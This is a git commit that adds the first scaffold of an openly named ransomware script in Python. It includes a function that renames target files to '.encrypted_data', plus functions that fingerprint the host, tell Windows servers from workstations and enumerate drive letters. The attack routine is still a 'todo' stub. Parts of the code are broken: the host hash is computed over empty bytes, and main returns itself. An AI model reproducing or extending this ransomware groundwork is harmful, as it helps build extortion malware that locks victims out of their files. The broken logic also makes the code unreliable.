746a63a4b3e08a87d54bc46f828c34d41543abc6
CorentinS9 <corentiinwolfft@gmail.com>
2023-05-09 01:05:20 +0200

    ransomware-start

---
+++ ransomware/ransomware.py
@@ -0,0 +1,49 @@
+import os
+import string
+
+import utile.config as config
+from time import time
+from hashlib import sha256
+from platform import node, win32_edition, system
+from re import search
+from os import path
+
+
+def attaque():
+    print('todo')
+
+
+def chiffre(cible):
+    os.rename(f'{cible}', f'{cible}.encrypted_data')
+    return "FIle has been encrypted"
+
+def hash_host_now():
+    identifiant = f'{node()}{time()}'
+    print(identifiant)
+    return sha256(bytes()).hexdigest()
+
+
+def os_type():
+    if search("[Ww]indows", system()):
+        if search("[Ss]erver", win32_edition()):
+            return "SERVER"
+        else:
+            return "WORKSTATION"
+    return None
+
+
+def list_disks():
+    dl = string.ascii_uppercase
+    # return ['%s:' % d for d in dl if path.exists('%s:' % d)]
+    disks = ''
+    for d in dl:
+        if path.exists('%s:' % d):
+            if disks != '':
+                disks += ','
+            disks += f'{d}:'
+    return disks
+
+
+def main():
+    return main
+
